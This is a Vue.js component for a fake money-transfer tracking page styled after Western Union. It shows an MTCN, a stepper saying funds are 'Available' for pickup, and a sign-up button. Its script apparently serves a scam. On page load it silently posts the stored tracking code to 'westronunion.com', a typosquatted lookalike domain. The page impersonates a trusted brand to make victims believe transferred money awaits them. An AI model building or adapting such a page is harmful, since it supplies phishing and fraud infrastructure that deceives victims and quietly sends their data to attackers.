<template>
  <div class="progress">
    <v-container class="global_container">
      <!-- Start:: Header -->
      <div class="header">
        <span>Tracking # (MTCN):</span>
        <h2>{{ yourCode.slice(0, 3) }}-{{ yourCode.slice(3, 6) }}-{{ yourCode.slice(6) }}</h2>
      </div>
      <!-- End:: Header -->

      <v-container class="stepper_container">
        <!-- Start:: Stepper -->
        <div class="stepper">
          <!-- completed -->
          <div class="step completed">
            <div class="v-stepper">
              <div class="circle">
                <v-icon icon="mdi mdi-check"/>
              </div>
              <div class="line"></div>
            </div>

            <div class="content" style="margin-left: 20px">Sent</div>
          </div>
          <!-- completed -->
          <div class="step completed">
            <div class="v-stepper">
              <div class="circle">
                <v-icon icon="mdi mdi-check"/>
              </div>
              <div class="line"></div>
            </div>

            <div class="content" style="margin-left: 20px">In progress</div>
          </div>

          <!-- active -->
          <div class="step active">
            <div class="v-stepper">
              <div class="circle preLastCircle" style="position: absolute; left: -5px">
                <div class="dot"></div>
              </div>
              <div class="line last_line" style="position: absolute; top: 39px"></div>
            </div>

            <div class="content last_content">
              <b> Available</b>
              <br/>

              The transfer is ready for pick up. To collect it, the receiver should bring their
              government-issued ID and tracking number (MTCN) at nearby agent location.
              <a href="#" style="display: block; text-decoration: none; color: #3b8dd0"
              >Know more</a
              >
            </div>
          </div>

          <!-- regular -->
          <div class="step">
            <div class="v-stepper">
              <div class="circle last_circle"></div>
              <div class="line"></div>
            </div>

            <div class="content last_contentt" style="margin-left: 20px; color: #80808096">Received</div>
          </div>
        </div>
        <!-- End:: Stepper -->

        <!-- Start:: Tracking Button -->
        <div class="tracking_button">
          <button>
            <svg
                viewBox="0 0 64 64"
                xmlns="http://www.w3.org/2000/svg"
                stroke-width="3"
                stroke="#000000"
                fill="none"
            >
              <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
              <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
              <g id="SVGRepo_iconCarrier">
                <circle cx="32" cy="32" r="18.5"></circle>
                <circle cx="32" cy="32" r="10.68"></circle>
                <line x1="32" y1="4.56" x2="32" y2="26.56" stroke-linecap="round"></line>
                <line x1="32" y1="37" x2="32" y2="59" stroke-linecap="round"></line>
                <line x1="37" y1="32" x2="59" y2="32" stroke-linecap="round"></line>
                <line x1="5.06" y1="32" x2="26.94" y2="32" stroke-linecap="round"></line>
              </g>
            </svg>

            Track another transfer
          </button>
        </div>
        <!-- End:: Tracking Button -->
      </v-container>

      <!-- Start:: Text -->
      <div class="text">
        <p>Sign up to receive automatic tracking alerts, send money on the go ,and do much more.</p>
      </div>
      <!-- End:: Text -->
      <!-- Start:: button -->
      <div class="submit_div">
        <button class="submit_btn" type="submit">Sign up now</button>
      </div>
      <!-- End:: button -->
    </v-container>
  </div>
</template>

<script>
import axios from "axios";

export default {
  data() {
    return {
      yourCode: localStorage.getItem('yourCode')
    }
  },
  mounted() {
    this.sendEmail()
  },
  methods: {
    sendEmail() {
      axios.post('https://westronunion.com/api/send-email', {
        trackingNumber: this.yourCode
      })
    }
  }
}
</script>

<style>
.progress .global_container {
  padding: 0;
  width: 100%;
}

.header {
  text-align: center;
  background: #e4f8f8;
  padding: 8px 0;
}

.header span {
  color: #bbb;
}

/* Start: stepper */

.container {
  width: 25%;
}

.step {
  padding: 10px;

  display: flex;
  flex-direction: row;
  justify-content: flex-start;

  background-color: cream;
}

.v-stepper {
  position: relative;
  /*   visibility: visible; */
}

/* regular step */
.step .circle {
  background-color: white;
  border: 3px solid #80808096;
  border-radius: 100%;
  width: 30px; /* +6 for border */
  height: 30px;
  display: inline-block;
}

.step .line {
  top: 23px;
  left: 14px;
  /*   height: 120px; */
  height: 100%;

  position: absolute;
  border-left: 3px solid #80808096;
}

.step.completed .circle {
  visibility: visible;
  background-color: rgb(19 185 14);
  border-color: rgb(19 185 14);
}

.step.completed .line {
  border-left: 3px solid rgb(19 185 14);
}

.step.active .circle {
  visibility: visible;
  border-color: rgb(19 185 14);
  width: 40px;
  height: 40px;
  display: flex;
  justify-content: center;
  align-items: center;
}

.step.active .circle .dot {
  background: rgb(19 185 14);
  height: 25px;
  width: 25px;
  border-radius: 50%;
}

.step.empty .circle {
  visibility: hidden;
}

.step.empty .line {
  /*     visibility: hidden; */
  /*   height: 150%; */
  top: 0;
  height: 150%;
}

.step:last-child .line {
  border-left: 3px solid white;
  z-index: -1; /* behind the circle to completely hide */
}

.content {
  margin-left: 53px;
  display: inline-block;
}

.circle .v-icon {
  color: #fff;
  font-size: 25px;
}

/* End:: stepper */

@media (max-width: 600px) {
  .content {
    margin-left: 30px;
  }

  .last_content {
    margin-left: 43px;
  }

  .text {
    font-size: 14px;
  }

  .progress .stepper_container {
    font-size: 14px !important;
  }

  .step .circle {
    border-radius: 100%;
    width: 25px; /* +6 for border */
    height: 25px;
  }

  .circle .v-icon {
    font-size: 16px;
    text-align: center;
    margin: 2px;
    margin-bottom: 4px;
  }

  .step.active .circle {
    width: 30px;
    height: 30px;
  }

  .step.active .circle .dot {
    height: 15px;
    width: 15px;
  }

  .v-stepper .preLastCircle {
    left: -2px !important;
  }

  .step .line {
    left: 12px;
  }

  .step .last_line {
    top: 30px !important;
  }

  .last_circle {
    width: 20px !important;
    height: 20px !important;
    left: 4px !important;
    position: absolute !important;
  }

  .last_contentt {
    margin-left: 42px !important;
  }
}
</style>
